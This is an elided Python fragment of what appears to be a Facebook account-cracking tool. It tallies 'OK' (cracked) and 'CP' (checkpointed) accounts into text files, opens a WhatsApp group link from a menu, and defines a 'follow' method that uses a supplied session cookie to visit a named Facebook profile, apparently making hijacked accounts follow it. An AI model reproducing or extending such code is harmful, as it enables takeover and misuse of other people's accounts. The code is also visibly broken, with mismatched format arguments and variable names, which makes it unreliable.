...
def Azim(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mAzim_OK.txt' % (H, P, str(len(ok))))
	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mAzim_CP.txt' % (H, P, str(len(cp))))
	    input("\x1b[1;97mPress enter to back Azim Menu ")
	    sarfraz()
...
def sarfraz():
    ...
    if _sarfraz___ in ('4', '04'):
    	pass
    os.system("xdg-open https://chat.whatsapp.com/01914436101 ")
class __xxx__:
    def __init__(self):
        self.id = []
    ...
    def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://www.facebook.com/Captain.TaRikuL.420', cookies={'cookie': coki}).text, 'html.parser')
